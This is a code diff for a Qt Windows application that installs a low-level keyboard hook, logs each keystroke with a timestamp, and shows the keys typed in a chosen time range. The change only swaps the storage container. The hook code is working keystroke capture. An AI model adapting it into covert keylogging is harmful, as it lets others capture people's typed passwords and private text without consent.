@@ -23,7 +23,7 @@ QString msFormat(quint64 ms)
     return ms2dt(ms).toString("yyyy/MM/dd hh:mm:ss.zzz");
 }
 
-QMap<quint64, QString> s_data;
+QList<QPair<quint64, QString> > s_data;
 HHOOK s_hook = NULL;
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -42,7 +42,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             if (iNumChar >= 1) {
                 quint64 key = QDateTime::currentDateTime().toMSecsSinceEpoch();
                 QString value = QString::fromStdWString(wstr);
-                s_data[key] = value;
+                s_data.append(QPair<quint64, QString>(key, value));
                 emit Global::instance()->sigNewInput(msFormat(key), value);
             } else {
                 wchar_t keyText[64] = {0};
@@ -53,7 +53,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                 if (GetKeyNameText(Flags, keyText, 64) > 0) {
                     quint64 key = QDateTime::currentDateTime().toMSecsSinceEpoch();
                     QString value = QString("[%1]").arg(QString::fromWCharArray(keyText));
-                    s_data[key] = value;
+                    s_data.append(QPair<quint64, QString>(key, value));
                     emit Global::instance()->sigNewInput(msFormat(key), value);
                 }
             }
@@ -129,12 +129,9 @@ void Dialog::slotGet()
     quint64 start = dt2ms(ui->dteStart->dateTime());
     quint64 end = dt2ms(ui->dteEnd->dateTime());
 
-    QMapIterator<quint64, QString> iter(s_data);
-    while (iter.hasNext()) {
-        iter.next();
-
-        if (iter.key() >= start && iter.key() <= end) {
-            ui->pteShow->insertPlainText(iter.value());
+    for(int i=0; i<s_data.count(); i++) {
+        if (s_data[i].first >= start && s_data[i].first <= end) {
+            ui->pteShow->insertPlainText(s_data[i].second);
         }
     }
 }
